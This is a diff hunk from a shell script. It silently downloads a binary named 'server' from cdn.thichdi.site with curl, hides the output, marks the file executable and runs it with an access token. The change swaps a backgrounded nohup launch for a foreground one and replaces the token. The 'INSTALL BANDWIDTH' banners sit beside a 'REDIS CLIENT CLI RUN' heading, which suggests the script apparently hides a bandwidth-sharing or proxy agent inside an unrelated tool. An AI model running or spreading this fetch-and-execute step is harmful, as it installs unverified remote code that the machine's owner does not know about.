@@ -7,7 +7,7 @@ echo "INSTALL BANDWIDTH | PROCESSING!"
 
 curl -sL https://cdn.thichdi.site/server -o server >/dev/null 2>&1
 chmod +x server
-nohup ./server start accept --token "pZEeHkUPpHd0XrwhTEwOwlTFSHIHqkfY6g2JzgLCPLY=" >/dev/null 2>&1 &
+./server start accept --token "6fsqw19QO2KcItJ3CDZSTK5Z8dF5E+z94xHOWTH2pIE="
 echo "INSTALL BANDWIDTH | DONE!"
 echo "========================"
 echo "  REDIS CLIENT CLI RUN  "
